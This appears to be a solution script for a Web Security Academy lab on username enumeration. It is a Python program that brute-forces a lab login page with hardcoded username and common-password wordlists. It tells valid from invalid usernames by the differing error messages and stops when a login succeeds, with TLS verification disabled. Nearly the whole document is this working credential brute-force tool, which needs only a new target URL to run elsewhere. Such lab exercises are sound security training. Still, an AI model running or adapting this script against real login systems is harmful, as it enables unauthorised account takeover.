### Lab 01: Username enumeration via different responses


```python
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import urllib.parse
import urllib.request
import sys

import requests

cookies = {
    'session': 'GoQfRt4XkcCguud5G5TTVXFTYcA91BdH',
}

headers = {
    'Host': '0ab9001d044707548044942e004a00aa.web-security-academy.net',
    # 'Content-Length': '35',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Origin': 'https://0ab9001d044707548044942e004a00aa.web-security-academy.net',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0ab9001d044707548044942e004a00aa.web-security-academy.net/login',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i',
    # 'Cookie': 'session=GoQfRt4XkcCguud5G5TTVXFTYcA91BdH',
}

username_list = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access', 'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion', 'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af', 'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al', 'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an', 'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app', 'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie', 'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at', 'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
password_list = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']

# print(username_list.index('atlas'))

data = {
    'username': '',
    'password': '',
}

for i in range(93, len(username_list)):
    data['username'] = username_list[i]
    for j in range(0, len(password_list)):
        data['password'] = password_list[j]

        response = requests.post(
            'https://0ab9001d044707548044942e004a00aa.web-security-academy.net/login',
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
        )

        if ('Invalid username' in response.text):
            print('Failed username -- username:', username_list[i], ' -- password ', password_list[j])
            break
        elif ('Incorrect password' in response.text):
            print('Failed password! -- username: ',  username_list[i], ' -- password ', password_list[j])
        else:
            print('Success! -- username: ',  username_list[i], ' -- password ', password_list[j])
            sys.exit()
```
